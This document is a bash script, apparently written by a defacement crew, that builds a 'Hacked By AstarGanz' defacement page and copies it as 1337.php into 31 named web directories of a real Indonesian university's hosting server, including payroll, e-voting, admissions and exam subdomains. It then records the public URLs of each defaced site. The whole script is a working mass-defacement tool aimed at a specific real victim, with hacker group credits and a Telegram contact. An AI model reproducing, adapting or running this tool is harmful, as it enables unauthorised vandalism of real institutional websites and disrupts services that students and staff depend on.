#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║           Mass Deface Uploader - UMRI Domains                    ║"
echo "║                   By: AstarGanz                                   ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Base directory
BASE_DIR="/var/www/vhosts/umri.ac.id"

# Target directories
TARGETS=(
    "admisi.umri.ac.id"
    "aktold.umri.ac.id"
    "akt.umri.ac.id"
    "cbt.kebidanan.umri.ac.id"
    "daftarnew.umri.ac.id"
    "daftar.umri.ac.id"
    "diary-mbkm.umri.ac.id"
    "diarymbkm.umri.ac.id"
    "e-senat.umri.ac.id"
    "evoting.umri.ac.id"
    "fsp.umri.ac.id"
    "git"
    "httpdocs"
    "icbisea.umri.ac.id"
    "importer.umri.ac.id"
    "kekampus.umri.ac.id"
    "laravel.umri.ac.id"
    "logs"
    "manpro.umri.ac.id"
    "mbkm.umri.ac.id"
    "moodlefk.umri.ac.id"
    "payroll.umri.ac.id"
    "pmb.umri.ac.id"
    "posse.umri.ac.id"
    "schedule.umri.ac.id"
    "siam.umri.ac.id"
    "sikuli.umri.ac.id"
    "sneba.feb.umri.ac.id"
    "spi.umri.ac.id"
    "umri_profile"
    "vote.umri.ac.id"
)

# Create deface file
create_deface() {
    cat > /tmp/1337.php << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://raw.githubusercontent.com/pengodehandal/botmusiktemanrandom/refs/heads/main/ChatGPT%20Image%2018%20Okt%202025%2C%2018.14.52.png" type="image/x-icon">
    <meta name="keywords" content="Indonesia">
    <meta name="description" content="Kau Sakiti Hatiku, Ku Sakiti Securitymu">
    <meta name="og:title" content="#HackerPatahHati">
    <title>#HackerPatahHati</title>
    <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            height: 100%;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            background: #000;
            font-family: 'Kelly Slab', sans-serif;
            color: #fff;
            position: relative;
        }
        
        .rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .drop {
            position: absolute;
            width: 1px;
            height: 60px;
            background: linear-gradient(transparent, rgba(255, 255, 255, 0.2));
            animation: fall linear infinite;
        }
        
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
        
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 0.8; }
        }
        
        .container {
            position: relative;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 50px 20px;
        }
        
        .content {
            text-align: center;
            width: 100%;
            max-width: 900px;
        }
        
        .img-container {
            margin-bottom: 30px;
            display: inline-block;
        }
        
        .profile-img {
            width: 100%;
            max-width: 280px;
            border-radius: 10px;
            box-shadow: 
                0 0 0 2px rgba(255, 255, 255, 0.08),
                0 20px 60px rgba(0, 0, 0, 0.8);
            animation: fadeIn 1.2s ease-in;
            display: block;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .hacker-title {
            font-size: 44px;
            margin: 20px 0 30px 0;
            line-height: 1.3;
        }
        
        .hacked-text {
            color: #ff0000;
            text-shadow: 
                0 0 10px rgba(255, 0, 0, 0.7),
                0 0 20px rgba(255, 0, 0, 0.4);
            animation: glitchText 4s infinite;
        }
        
        @keyframes glitchText {
            0%, 92%, 100% {
                text-shadow: 
                    0 0 10px rgba(255, 0, 0, 0.7),
                    0 0 20px rgba(255, 0, 0, 0.4);
                transform: translate(0);
            }
            94% {
                text-shadow: 
                    -3px 0 0 #ff0000,
                    3px 0 0 #00ffff;
                transform: translate(-2px, 0);
            }
            96% {
                text-shadow: 
                    3px 0 0 #ff0000,
                    -3px 0 0 #00ffff;
                transform: translate(2px, 0);
            }
        }
        
        .hacker-name {
            color: #fff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
        }
        
        .terminal-container {
            margin: 30px auto;
            max-width: 700px;
            animation: slideIn 1s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .terminal-header {
            background: linear-gradient(to bottom, #2a2a2a, #1f1f1f);
            padding: 12px 15px;
            border-radius: 8px 8px 0 0;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #1a1a1a;
        }
        
        .terminal-btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
        }
        
        .btn-close { background: #ff5f56; }
        .btn-minimize { background: #ffbd2e; }
        .btn-maximize { background: #27c93f; }
        
        .terminal-title {
            flex: 1;
            text-align: center;
            font-size: 12px;
            color: #666;
            font-family: 'Share Tech Mono', monospace;
        }
        
        .terminal-body {
            background: #0a0a0a;
            padding: 25px 20px;
            border-radius: 0 0 8px 8px;
            border: 1px solid #1a1a1a;
            border-top: none;
            font-family: 'Share Tech Mono', monospace;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9);
            text-align: left;
        }
        
        .terminal-line {
            margin: 10px 0;
            display: flex;
            flex-wrap: wrap;
            word-break: break-word;
        }
        
        .prompt {
            color: #ff0000;
            margin-right: 10px;
            font-weight: bold;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.4);
            white-space: nowrap;
        }
        
        .terminal-text {
            color: #00ff00;
            line-height: 1.6;
            flex: 1;
            text-shadow: 0 0 2px rgba(0, 255, 0, 0.3);
            min-width: 0;
        }
        
        .cursor {
            display: inline-block;
            width: 10px;
            height: 18px;
            background: #00ff00;
            margin-left: 5px;
            animation: blink 1s step-end infinite;
        }
        
        @keyframes blink {
            50% { opacity: 0; }
        }
        
        .marquee-container {
            margin: 30px auto;
            max-width: 700px;
            overflow: hidden;
            background: rgba(20, 20, 20, 0.6);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 4px;
            padding: 12px 0;
        }
        
        .marquee-content {
            display: inline-block;
            white-space: nowrap;
            animation: marquee 30s linear infinite;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            color: #fff;
        }
        
        @keyframes marquee {
            0% {
                transform: translateX(100%);
            }
            100% {
                transform: translateX(-100%);
            }
        }
        
        .marquee-title {
            color: #ff0000;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .marquee-name {
            color: #00ff00;
            margin: 0 10px;
        }
        
        .contact-section {
            margin: 30px 0;
        }
        
        .contact-link {
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 10px 20px;
            transition: all 0.3s ease;
            display: inline-block;
            font-family: 'Share Tech Mono', monospace;
            border-radius: 4px;
        }
        
        .contact-link:hover {
            color: #ff0000;
            border-color: #ff0000;
            background: rgba(255, 0, 0, 0.05);
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
            transform: translateY(-2px);
        }
        
        .crew-info {
            font-size: 11px;
            margin: 25px 0;
            line-height: 2;
            font-family: 'Share Tech Mono', monospace;
            word-wrap: break-word;
        }
        
        .crew-red {
            color: #ff0000;
            font-weight: bold;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.4);
        }
        
        .crew-dark {
            color: #555;
        }
        
        .divider {
            color: #333;
            margin: 0 6px;
        }
        
        .audio-section {
            margin-top: 25px;
        }
        
        audio {
            width: 100%;
            max-width: 400px;
            height: 40px;
            filter: invert(1) hue-rotate(180deg);
            border-radius: 8px;
        }
        
        img[alt="www.000webhost.com"] {
            display: none !important;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 35px 15px;
            }
            
            .profile-img {
                max-width: 220px;
            }
            
            .hacker-title {
                font-size: 30px;
                margin: 18px 0 25px 0;
            }
            
            .terminal-container {
                margin: 25px 0;
            }
            
            .terminal-header {
                padding: 10px 12px;
            }
            
            .terminal-title {
                font-size: 10px;
            }
            
            .terminal-body {
                padding: 18px 15px;
                font-size: 13px;
            }
            
            .terminal-line {
                margin: 8px 0;
            }
            
            .prompt {
                font-size: 13px;
                margin-right: 8px;
            }
            
            .terminal-text {
                font-size: 13px;
            }
            
            .contact-link {
                font-size: 12px;
                padding: 8px 16px;
            }
            
            .crew-info {
                font-size: 10px;
                line-height: 1.8;
            }
            
            .divider {
                margin: 0 4px;
            }
            
            .marquee-content {
                font-size: 11px;
            }
            
            audio {
                max-width: 100%;
            }
        }
        
        @media (max-width: 480px) {
            .profile-img {
                max-width: 180px;
            }
            
            .hacker-title {
                font-size: 26px;
            }
            
            .terminal-body {
                padding: 15px 12px;
                font-size: 12px;
            }
            
            .terminal-text {
                font-size: 12px;
            }
            
            .crew-info {
                font-size: 9px;
            }
            
            .marquee-content {
                font-size: 10px;
            }
        }
    </style>
</head>
<body oncontextmenu="return false">
    
    <div class="rain" id="rain"></div>
    <div class="stars" id="stars"></div>
    
    <div class="container">
        <div class="content">
            
            <div class="img-container">
                <img src="https://i.pinimg.com/originals/54/d7/30/54d7302c08408339574b95b9a911c51a.gif" 
                     alt="Profile" 
                     class="profile-img">
            </div>
            
            <div class="hacker-title">
                <span class="hacked-text">Hacked By</span> 
                <span class="hacker-name">AstarGanz</span>
            </div>
            
            <div class="terminal-container">
                <div class="terminal-header">
                    <span class="terminal-btn btn-close"></span>
                    <span class="terminal-btn btn-minimize"></span>
                    <span class="terminal-btn btn-maximize"></span>
                    <div class="terminal-title">root@heartbroken:~</div>
                </div>
                <div class="terminal-body">
                    <div class="terminal-line">
                        <span class="prompt">root@system:~$</span>
                        <span class="terminal-text">cat vulnerability.txt</span>
                    </div>
                    <div class="terminal-line">
                        <span class="prompt">></span>
                        <span class="terminal-text">Setiap sistem punya kelemahan, begitu juga diriku.</span>
                    </div>
                    <div class="terminal-line">
                        <span class="prompt">></span>
                        <span class="terminal-text">Kelemahanku adalah terlalu percaya padamu,</span>
                    </div>
                    <div class="terminal-line">
                        <span class="prompt">></span>
                        <span class="terminal-text">terlalu berharap kau akan setia,</span>
                    </div>
                    <div class="terminal-line">
                        <span class="prompt">></span>
                        <span class="terminal-text">terlalu yakin kita akan bertahan.</span>
                    </div>
                    <div class="terminal-line" style="margin-top: 15px;">
                        <span class="prompt">root@system:~$</span>
                        <span class="cursor"></span>
                    </div>
                </div>
            </div>
            
            <div class="marquee-container">
                <div class="marquee-content">
                    <span class="marquee-title">[ BIG THANKS TO ]</span>
                    <span class="marquee-name">BBoscat</span> ✦
                    <span class="marquee-name">Heru1337</span> ✦
                    <span class="marquee-name">Omest</span> ✦
                    <span class="marquee-name">Nulz1337</span> ✦
                    <span class="marquee-name">./Cr0t</span> ✦
                    <span class="marquee-name">Mr.Donuts</span> ✦
                    <span class="marquee-name">Arya Kresna</span> ✦
                    <span class="marquee-name">Putra</span> ✦
                    <span class="marquee-name">Wedus_X12</span> ✦
                    <span class="marquee-name">Black_X12</span> ✦
                    <span class="marquee-name">Fell_MBT</span> ✦
                    <span class="marquee-name">SultanHaikal</span> ✦
                    <span class="marquee-name">Morgan1337</span> ✦
                    <span class="marquee-name">Pahing1337</span> ✦
                    <span class="marquee-name">And You!</span>
                </div>
            </div>
            
            <div class="contact-section">
                <a href="https://t.me/ibarat1337" target="_blank" class="contact-link">
                    [ https://t.me/ibarat1337 ]
                </a>
            </div>
            
            <div class="crew-info">
                <span class="crew-red">0x1999</span> <span class="divider">|</span>
                <span class="crew-dark">GalauCrew</span> <span class="divider">|</span>
                <span class="crew-red">Hacker Patah Hati</span> <span class="divider">|</span>
                <span class="crew-dark">Typical Idiot Security</span> <span class="divider">|</span>
                <span class="crew-red">Manusia Biasa Team</span> <span class="divider">|</span>
                <span class="crew-dark">Garuda Suspend Commision</span> <span class="divider">|</span>
                <span class="crew-red">IndoXploit</span>
            </div>
            
            <div class="audio-section">
                <audio controls loop autoplay>
                    <source src="https://github.com/pengodehandal/botmusiktemanrandom/raw/refs/heads/main/NaFF%20-%20Terendap%20Laraku%20Official%20Music%20Video.mp3" type="audio/mpeg" />
                </audio>
            </div>
            
        </div>
    </div>
    
    <script>
        const rainContainer = document.getElementById('rain');
        for (let i = 0; i < 30; i++) {
            const drop = document.createElement('div');
            drop.className = 'drop';
            drop.style.left = Math.random() * 100 + '%';
            drop.style.animationDuration = (Math.random() * 1 + 0.5) + 's';
            drop.style.animationDelay = Math.random() * 2 + 's';
            rainContainer.appendChild(drop);
        }
        
        const starsContainer = document.getElementById('stars');
        for (let i = 0; i < 80; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDelay = Math.random() * 3 + 's';
            starsContainer.appendChild(star);
        }
    </script>
    
</body>
</html>
HTMLEOF
}

# Upload function
upload_to_target() {
    local target=$1
    local full_path="${BASE_DIR}/${target}"
    
    # Check if directory exists
    if [ ! -d "$full_path" ]; then
        echo -e "${RED}[✗] Directory not found: ${target}${NC}"
        return 1
    fi
    
    # Try to copy file
    if cp /tmp/1337.php "${full_path}/1337.php" 2>/dev/null; then
        chmod 644 "${full_path}/1337.php" 2>/dev/null
        echo -e "${GREEN}[✓] SUCCESS: ${target}/1337.php${NC}"
        echo "https://${target}/1337.php" >> /tmp/deface_urls.txt
        return 0
    else
        echo -e "${RED}[✗] FAILED: ${target} (Permission denied)${NC}"
        return 1
    fi
}

# Main execution
main() {
    local success=0
    local failed=0
    local total=${#TARGETS[@]}
    
    echo -e "${CYAN}[*] Creating deface file...${NC}"
    create_deface
    echo -e "${GREEN}[✓] Deface file created${NC}\n"
    
    echo -e "${CYAN}[*] Starting mass upload to ${total} targets...${NC}\n"
    
    # Clear previous URLs
    > /tmp/deface_urls.txt
    
    # Upload to each target
    for target in "${TARGETS[@]}"; do
        if upload_to_target "$target"; then
            ((success++))
        else
            ((failed++))
        fi
        sleep 0.1
    done
    
    # Summary
    echo ""
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    UPLOAD COMPLETE!                               ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}  Success: ${success}${NC}"
    echo -e "${RED}  Failed : ${failed}${NC}"
    echo -e "${YELLOW}  Total  : ${total}${NC}"
    echo ""
    
    # Show URLs
    if [ -s /tmp/deface_urls.txt ]; then
        echo -e "${CYAN}[*] Accessible URLs:${NC}"
        cat /tmp/deface_urls.txt
        echo ""
        echo -e "${GREEN}[+] URLs saved to: /tmp/deface_urls.txt${NC}"
    fi
    
    # Cleanup
    rm -f /tmp/1337.php
}

# Run
main